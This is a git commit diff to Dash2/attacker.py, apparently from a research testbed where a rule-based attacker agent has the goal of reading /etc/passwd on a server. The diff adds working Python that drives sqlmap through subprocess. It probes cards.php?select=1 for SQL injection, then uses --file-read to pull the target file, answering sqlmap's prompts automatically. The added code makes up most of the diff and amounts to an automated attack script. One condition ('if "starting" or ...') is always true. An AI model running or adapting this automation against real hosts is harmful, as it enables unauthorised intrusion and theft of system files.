12e4e2fbeeaed20052dd4b1ea86f4e9f02658c3d
Jim Blythe <blythe@users.isi.deterlab.net>
2016-01-03 08:15:36 -0800

    Using Popen to interact with processes

--- Dash2/attacker.py
+++ Dash2/attacker.py
@@ -3,7 +3,7 @@ import subprocess
 
 readAgent("""
 
-goalWeight readFile(!localhost, !/etc/passwd) 1
+goalWeight readFile(!server3, !/etc/passwd) 1
 
 goalRequirements readFile(target, file)
   SQLVulnerability(target, port, baseUrl, parameter)
@@ -21,10 +21,12 @@ goalRequirements service(target, port, protocol)
 
 # this predicate means the information is known, and also records
 # that a subgoal has been achieved
-known likelyVulnerability(!server1, !80, !index.html, !name)
+known likelyVulnerability(!server1, !80, !cards.php, !select)
+known likelyVulnerability(!server3, !80, !cards.php, !select)
 known likelyVulnerability(!localhost, !80, !index.html, !name)
 
 known reachable(anywhere, !server1)
+known reachable(anywhere, !server3)
 known reachable(anywhere, !localhost)
 
 """)
@@ -83,7 +85,7 @@ def portScanner(action):
                 bindingsList.append({})   # constants all match, record success
     return bindingsList
 
-SQLMapHome = "~blythe/attack/sqlmap"
+SQLMapHome = "/users/blythe/attack/sqlmap"
 
 def sqlMap(action):
     print "Called sql map with action", action
@@ -91,30 +93,70 @@ def sqlMap(action):
     # Remove the prefix exclamation marks
     [host, port, base, parameter] = [arg[1:] for arg in action[1:]]
     proc = None
+    call = ["python", SQLMapHome + "/sqlmap.py", "-u", "http://" + host + ":" + port + "/" + base + "?" + parameter + "=1"]
     try:
-        proc = subprocess.check_output(["python", SQLMapHome + "/sqlmap.py", "-u",
-                                        "http://" + host + ":" + port + "/" + base + "?" + parameter + "=1"]).split('\n')
-    except:
-        print "Unable to run sqlmap"
+        proc = subprocess.Popen(call,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
+    except BaseException as e:
+        print "Unable to run sqlmap:", e
         return []
     result = []
     printing = False
     seenDashes = 0  # follow the same algorithm for printing as the original java version
-    for line in proc:
+    line = proc.stdout.readline()
+    control = ''
+    for i in range(1,32):
+        control += chr(i)
+    while line != "":
+        # Try removing all control characters and printing
+        line = line.translate(None, control)
         if "the following injection point" in line:    # found at least one injection point
-            result = [{}]
-            printing = true
+            result = [{}]    # This would signify success without adding new bindings
+            printing = True
         if printing:
             print("SQLMap: " + line)
             if "---" in line:
                 seenDashes += 1
                 if seenDashes == 2:
                     printing = False
+        if "o you want to" in line:
+            print "SQLMap (answering):", line
+            proc.stdin.write('\n')    # take the default option
+        if "starting" or "shutting down" in line:
+            print "SQLMap:", line
+        if "shutting down" in line:
+            line = ""
+        line = proc.stdout.readline()
+    print "Finished sqlmap"
+    print proc.communicate()
     return result
 
 def sqlInjectionReadFile(args):
     print "Performing sql injection attack to read a file with args", args
-    return [{}]   # This would signify success without adding new bindings
+    [source, target, targetFile, port, baseUrl, parameter] = [arg[1:] for arg in args[1:]]  # assume constants, remove !
+    # Call is very similar to sqlMap above with an extra --file-read argument
+    result = []
+    try:
+        call = ["python", SQLMapHome + "/sqlmap.py", "-u",
+                "http://" + target + ":" + port + "/" + baseUrl + "?" + parameter + "=1",
+                "--file-read=" + targetFile]
+        proc = subprocess.Popen(call, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        # The java sends three carriage returns - here I look for lines asking questions and send them
+        control = ''
+        for i in range(1,32):
+            control += chr(i)
+        line = proc.stdout.readline()
+        while line != "":
+            line = line.translate(None, control)
+            print "SQLMap read:", line
+            if 'o you want to' in line:
+                print "Sending default answer:", line
+                proc.stdin.write('\n')
+            if "the local file" in line:
+                result = [{}]
+            line = proc.stdout.readline()
+    except BaseException as e:
+        print "Unable to run sqlmap to read file:", e
+    return result
 
 primitiveActions([('SQLInjectionReadFile', sqlInjectionReadFile), 
                   ('portScanner', portScanner),
